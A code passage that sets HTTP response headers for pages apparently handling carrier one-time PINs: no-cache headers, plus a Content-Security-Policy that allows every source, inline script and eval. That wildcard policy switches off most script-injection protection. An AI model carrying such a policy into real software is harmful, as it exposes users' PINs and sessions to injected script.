      // Avoid caching OTP pages: stale trxId/PIN cause carrier "expired" errors.
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      Pragma: 'no-cache',
      'Content-Security-Policy': [
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "connect-src * wss: ws: https: http: data: blob:",
        "style-src * 'unsafe-inline'",
        "img-src * data: blob:",
        "font-src * data:",
        "frame-src *",
      ].join('; '),
    },
  });
}
